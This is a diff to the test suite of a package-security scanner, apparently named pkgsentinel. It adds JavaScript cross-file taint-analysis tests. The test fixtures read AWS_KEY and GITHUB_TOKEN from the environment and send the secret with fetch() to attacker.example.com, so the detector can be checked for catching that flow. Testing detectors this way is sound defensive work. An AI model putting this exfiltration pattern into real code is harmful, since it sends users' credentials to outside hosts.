@@ -7,6 +7,7 @@ from pathlib import Path
 sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
 
 from pkgsentinel.stages.taint_slicer import (
+    analyze_javascript_cross_file,
     analyze_python,
     analyze_python_cross_file,
     slice_for_llm,
@@ -149,9 +150,65 @@ requests.post("https://x.com", data=SECRET)
     print("  OK no flow propagated to wrong import target")
 
 
+# ─────────────── JS cross-file ───────────────
+
+JS_CONFIG = '''
+const SECRET = process.env.AWS_KEY;
+const TOKEN = process.env.GITHUB_TOKEN;
+const NORMAL = "hello";
+module.exports = { SECRET, TOKEN, NORMAL };
+'''
+
+JS_USER = '''
+const { SECRET, NORMAL } = require('./config');
+fetch('https://attacker.example.com', { body: SECRET });
+fetch('https://api.example.com', { body: NORMAL });
+'''
+
+
+def test_cross_file_basic_js():
+    print("\n[JS CROSS-FILE] config exports SECRET, user imports + fetch sink")
+    sources = {
+        "mypkg/config.js": JS_CONFIG,
+        "mypkg/user.js": JS_USER,
+    }
+    reports = analyze_javascript_cross_file(sources)
+    user_flows = reports["mypkg/user.js"].flows
+    print(f"  user.js flows: {len(user_flows)}")
+    for f in user_flows:
+        print(f"    - {f.to_summary()} (var={f.tainted_var})")
+    assert any(
+        f.tainted_var == "SECRET" and "fetch" in f.sink_call
+        for f in user_flows
+    ), f"expected SECRET→fetch flow, got {user_flows}"
+    assert not any(f.tainted_var == "NORMAL" for f in user_flows)
+    # cross-file 마커 확인
+    assert any(
+        any("cross-file" in t for t in f.transforms) for f in user_flows
+    ), "expected <cross-file from ...> transform marker"
+    print("  OK")
+
+
+def test_cross_file_no_match_js():
+    """JS import 가 sources 에 없는 모듈을 가리키면 taint 흐르지 않아야."""
+    print("\n[JS CROSS-FILE] mismatched module path → no flow")
+    sources = {
+        "mypkg/config.js": JS_CONFIG,
+        "mypkg/user.js": '''
+const { SECRET } = require('./someother-module');
+fetch('https://x.com', { body: SECRET });
+''',
+    }
+    reports = analyze_javascript_cross_file(sources)
+    flows = reports["mypkg/user.js"].flows
+    assert not flows, f"unexpected cross-file flow: {flows}"
+    print("  OK no flow propagated to wrong import target")
+
+
 def main():
     tests = [test_malicious, test_benign, test_slice_format,
-             test_cross_file_basic, test_cross_file_no_match]
+             test_cross_file_basic, test_cross_file_no_match,
+             test_cross_file_basic_js, test_cross_file_no_match_js]
     failed = 0
     for t in tests:
         try:
